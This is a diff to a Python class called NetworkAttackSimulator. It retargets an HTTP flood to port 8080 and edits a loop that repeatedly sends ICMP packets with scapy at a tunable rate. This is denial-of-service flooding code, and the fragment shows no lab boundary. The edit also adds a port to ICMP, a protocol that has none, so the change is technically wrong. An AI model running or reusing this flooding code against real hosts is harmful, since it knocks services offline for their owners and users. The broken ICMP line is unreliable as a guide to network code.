@@ -58,7 +58,7 @@ class NetworkAttackSimulator:
         return self.attack_thread
 
     def perform_http_flood(self, intensity):
-        url = f"http://{self.target_ip}"
+        url = f"http://{self.target_ip}:8080"
         self.logger.info(f"Starting HTTP Flood attack on {url}")
         self.intensity = intensity
         self.attacking = True
@@ -74,7 +74,7 @@ class NetworkAttackSimulator:
 
     def send_icmp_packets(self):
         while self.attacking and not self.stop_event.is_set():
-            send(IP(dst=self.target_ip) / ICMP(), verbose=False)
+            send(IP(dst=self.target_ip) / ICMP(dport=8080), verbose=False)
             time.sleep(1.0 / self.intensity)
 
     def send_http_requests(self, url):
